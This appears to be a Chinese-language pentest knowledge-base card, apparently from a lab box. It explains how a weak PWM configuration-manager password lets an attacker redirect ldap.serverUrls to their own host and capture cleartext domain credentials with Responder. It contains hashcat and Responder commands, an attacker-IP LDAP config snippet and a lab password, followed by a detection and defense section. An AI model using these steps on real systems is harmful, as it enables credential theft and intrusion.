---
id: web-generic-auth-pwm-config-editor-ldap-url-responder
title: PWM 配置管理器弱口令：改 LDAP URL 指向 Responder 捕获域账号明文
type: scenario
domain: web
path: web/generic/auth
technique: pwm-config-editor-ldap-url-poisoning
tags:
- pwm
- password-self-service
- config-editor
- bcrypt
- ldap
- responder
- credential-capture
- active-directory
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:58:02+08:00'
  notes: 已对照原文与 img26-29：PwmConfiguration.xml 中 configPasswordHash 为 bcrypt $2y$04$...，hashcat -m 3200 得 rockon!；配置管理器可导入/下载配置，ldap.serverUrls 被改为 ldap://10.10.14.23:389（img28 健康检查显示连接该地址），Responder -I tun0 -A 捕获 Cleartext Username CN=svc_infra... 与 Cleartext Password m6tneOMAh5p0wQ0d。注意原文 Responder 处于 analyze 模式，实际是配置重定向 LDAP 流量、并非广播投毒；卡片机制描述正确，术语可留意。未实测。
url: /docs/web/generic/auth/web-generic-auth-pwm-config-editor-ldap-url-responder/
draft: false
kb_aliases:
- PWM 配置管理器
- PwmConfiguration.xml
- bcrypt 配置口令
- LDAP URL 篡改
- Responder LDAP 投毒
- 密码自助服务凭据捕获
---

## 一句话结论

PWM 密码自助服务的配置管理器若使用弱口令保护（`configPasswordHash` 为可爆破的 bcrypt），攻击者可破解后登录/下载配置，把 `ldap.serverUrls` 改成自己的 LDAP 服务器地址并上传；PWM 在认证/测试时向该地址发起 LDAP bind，Responder 即可捕获域账号的明文用户名与口令。

## 原理

- PWM（Password Self Service）把配置保存在 `PwmConfiguration.xml`，配置编辑器用 `configPasswordHash`（bcrypt `$2y$`）保护；弱口令可被 `hashcat -m 3200` 用 rockyou 等字典快速破解。
- 配置包含 `ldap.serverUrls`、`ldap.proxy.username`、`ldap.proxy.password` 等 LDAP 连接参数；配置管理器支持下载/导入配置（原文 `Configuration Manager` → `Download Configuration` / `Import Configuration`）。
- 攻击者把 `ldap.serverUrls` 改为攻击机 IP:389，上传配置后，PWM 在用户认证、LDAP 测试或健康检查时向该 URL 发起 bind；Responder 的 LDAP 服务记录 `Cleartext Username` 与 `Cleartext Password`。
- 原文配置文件还设置了 `display.showDetailedErrors=true`、`configIsEditable=true`，降低了配置攻击门槛；Responder 捕获到 `CN=svc_infra,CN=Users,DC=fries,DC=htb` / `m6tneOMAh5p0wQ0d`，随后用该口令 SSH 登录并继续域内枚举。
- 之所以成立：配置编辑器是应用的高权功能，但只由静态密码保护；LDAP URL 未做白名单/签名校验，PWM 又必须向 LDAP 绑定验证用户，攻击者控制配置即可把认证流量引到自己。

## 触发条件

- PWM 配置管理器可从攻击机访问（或先通过容器 RCE/文件读取拿到配置）；
- `configPasswordHash` 使用弱口令，可被字典/规则爆破；
- 配置可下载/上传，或攻击者能直接修改容器内 `PwmConfiguration.xml` 并触发重载；
- PWM 使用明文 `ldap://`（非 LDAPS）且能从容器访问攻击机的 389 端口；
- Responder/伪造 LDAP 服务可被 PWM 访问，且目标会触发一次认证/测试。

## 利用步骤

1. 访问 PWM，确认配置管理器入口（如 `Configuration Manager`/`Configuration Editor`）；下载 `PwmConfiguration.xml` 或从容器内读取。
2. 提取 `configPasswordHash`（bcrypt `$2y$...`），用 hashcat 破解：
   ```bash
   hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```
3. 用破解出的口令登录配置管理器；若可直接下载配置，修改 `ldap.serverUrls`：
   ```xml
   <setting key="ldap.serverUrls" ...>
     <value>ldap://<attacker-ip>:389</value>
   </setting>
   ```
4. 上传/保存配置，等待 PWM 重载；在攻击机启动 Responder 并监听 LDAP：
   ```bash
   sudo responder -I tun0 -A
   ```
5. 触发 PWM 的 LDAP 认证/测试（登录页、健康检查、测试用户），观察 Responder 捕获的 `Cleartext Username`/`Cleartext Password`。
6. 用捕获的域账号口令 SSH/SMB/WinRM 验证；继续 BloodHound/gMSA/ADCS 链。
7. 恢复原配置、清理上传文件与会话，记录捕获时间与来源。

## PoC

```bash
# 1. 破解配置口令
hashcat -m 3200 -a 0 config.hash /usr/share/wordlists/rockyou.txt
# $2y$04$...:rockon!

# 2. 修改配置（示意）
# <setting key="ldap.serverUrls"><value>ldap://10.10.16.69:389</value></setting>

# 3. 启动 Responder（LDAP 服务）
sudo responder -I tun0 -A

# 4. 触发 PWM 认证/测试后，Responder 输出：
# [LDAP] Cleartext Client   : 10.10.11.96
# [LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
# [LDAP] Cleartext Password : <password>
```

## 变体与关联

- 变体：若配置口令强，可先通过容器 RCE 直接读写 `PwmConfiguration.xml`，或利用 `configIsEditable=true`/默认配置进入。
- 变体：若 PWM 使用 LDAPS，需伪造证书或改用其他入口；Responder 的 LDAP 服务默认明文，LDAPS 需额外证书配置。
- 关联：进入容器/读配置的链 [[cloud-container-docker-tls-ca-key-client-cert-api]]、[[web-python-framework-pgadmin-cve-2025-2945-authenticated-rce]]；捕获域账号后接 [[pentest-ad-gmsa-readgmsapassword-managedpassword-ntlm]]、[[pentest-ad-adcs-esc7-enable-esc6-esc16-admin-certificate]]。

## 检测与防御

- 检测：`PwmConfiguration.xml` 的 `ldap.serverUrls` 被改为外部地址；配置管理器登录/下载/上传异常；PWM 容器向非域控 LDAP 端口发起连接；Responder/伪造 LDAP 流量（局域网内异常 LDAP bind）。
- 防御：配置管理器使用强口令并限制来源 IP；初始化后关闭配置编辑器/改为只读；`ldap.serverUrls` 做白名单与配置签名；强制 LDAPS 并校验证书；监控配置文件变更与异常 LDAP 出站；不要把域代理账号口令明文/可解存储在配置中。
- 注意：Responder 的 LDAP 捕获依赖目标发起明文 bind；若目标只做 LDAPS 或先校验服务器证书，本手法需调整。测试时避免影响正常认证。
